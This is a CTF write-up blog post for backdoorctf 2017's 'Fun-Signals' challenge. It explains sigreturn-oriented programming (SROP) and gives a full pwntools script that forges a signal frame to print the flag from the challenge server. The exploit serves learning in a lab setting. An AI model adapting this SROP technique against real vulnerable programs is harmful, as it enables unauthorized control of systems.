---
layout: post
title: backdoorctf 2017 - Fun-Signals Writeup
categories: ctf_backdoorctf17
keywords: "exploitation"
comments: true
authors:
    - andreafioraldi
---
{{ page.date | date: "%B %-d, %Y" }}


This binary has a very small portion of code.

Analize it in IDA:

<img class="img-responsive" src="{{ site-url }}/assets/backdoorctf17/funsignals-1.png">

The first syscall is a read (rax = 0) of 1024 bytes in the stack.

The second is rt_sigreturn.

For a l337 h4xx0r sigreturn means SROP. For me it means [Wikipedia](https://en.wikipedia.org/wiki/Sigreturn-oriented_programming).

I learnt that we can control the program flow like with rop using sigreturn and the associated structure on the stack.

This structure contains the context of the signal handler.

So writing this structure on the stack (with read) we have the complete control of all registers.

A good choice is to prepare the registers for a write to the stdout of the flag.

The syscall gadget under `int 3` is a perfect target for rip.

Wait, how is composed a signal frame? I don't know, but pwnlib does.

```python
from pwn import *

context.arch = "amd64"

frame = SigreturnFrame()
frame.rax = constants.SYS_write
frame.rdi = constants.STDOUT_FILENO
frame.rsi = 0x10000023 #flag string address
frame.rdx = 50 #read size
frame.rsp = 0xABADCAFE
frame.rip = 0x10000015 #syscall gadget

#p = process("./player_bin")
p = remote("163.172.176.29", 9034)
p.send(str(frame))

print p.recvall()
```

